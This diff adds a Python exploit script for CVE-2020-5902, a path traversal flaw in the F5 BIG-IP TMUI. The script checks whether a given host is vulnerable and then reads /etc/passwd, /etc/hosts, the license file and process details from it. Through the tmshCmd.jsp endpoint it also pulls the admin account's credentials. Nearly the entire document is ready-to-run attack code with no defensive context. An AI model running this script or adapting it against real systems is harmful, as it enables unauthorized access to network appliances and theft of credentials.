@@ -1,0 +1,128 @@
+# Exploit Title: F5 Big-IP 13.1.3 Build 0.0.6 - Local File Inclusion
+# Date: 2019-08-17
+# Exploit Author: Carlos E. Vieira
+# Vendor Homepage: https://www.f5.com/products/big-ip-services
+# Version: <= 13.1.3
+# Tested on: BIG-IP 13.1.3 Build 0.0.6
+# CVE : CVE-2020-5902
+
+#!/usr/bin/env python
+
+import requests
+import sys
+import time
+import urllib3
+import json 
+urllib3.disable_warnings()
+
+global target
+
+def checkTarget():
+
+    r = requests.head(target + "/tmui/login.jsp", verify=False)
+    if(r.status_code == 200):
+        return True
+    else:
+        return False
+
+def checkVuln():
+
+    r = requests.get(target + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", verify=False)
+    if(r.status_code == 200):
+        
+        data = json.loads(r.text)
+        if(len(data['output']) > 0):
+            return True 
+        else:
+            return False
+
+    else:
+        return False
+
+def leakPasswd():
+    print("[+] Leaking /etc/passwd from server")
+    time.sleep(2)
+    exploit('/etc/passwd')
+
+
+def leakHosts():
+    print("[+] Leaking /etc/hosts from server")
+    time.sleep(2)
+    exploit('/etc/hosts')
+
+def leakLicence():
+
+    print("[+] Leaking /config/bigip.license from server")
+    time.sleep(2)
+    exploit('/config/bigip.license')
+
+def leakAdmin():
+
+    print("[+] Leaking admin credentials from server")
+    time.sleep(2)
+    r = requests.get(target + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin", verify=False)
+    if(r.status_code == 200):
+        
+        data = json.loads(r.text)
+        if(len(data['output']) > 0 ):
+            print(data['output'])
+        else:
+            print("[X] Admin credentials not found")
+    else:
+        print("[X] Fail to read file")
+
+
+def exploit(file):
+    
+    r = requests.get(target + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=" + file, verify=False)
+    if(r.status_code == 200):
+        data = json.loads(r.text)
+        print(data['output'])
+    else:
+        print("[X] Fail to read file")
+
+def memoryLeak():
+    print("[!] Leaking tomcat process from server")
+    time.sleep(2)        
+    r = requests.get(target + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/proc/self/cmdline", verify=False)
+    if(r.status_code == 200):
+        data = json.loads(r.text)
+        if(len(data['output'])>0):
+            print("Command: " + data['output'])
+
+def main(host):
+
+    print("[+] Check target...")
+    global target
+    target = "https://" + host
+
+    check = checkTarget()
+    if(check):
+        print("[~] Target is available")
+
+        vuln = checkVuln()
+        if(vuln):
+            print("[+] Target is vulnerable!")
+
+            time.sleep(1)
+            print("[~] Leak information from target!")
+            time.sleep(1)
+            leakPasswd()
+            leakHosts()
+            leakLicence()
+            leakAdmin()
+            memoryLeak()
+        else:
+            print("[X] Target is't vulnerable")
+
+    else:
+        print("[x] Target is unavailable")
+
+
+if __name__ == "__main__":
+
+    if(len(sys.argv) < 2):
+        print("Use: python {} ip/dns".format(sys.argv[0]))
+    else:
+        host = sys.argv[1]
+        main(host)
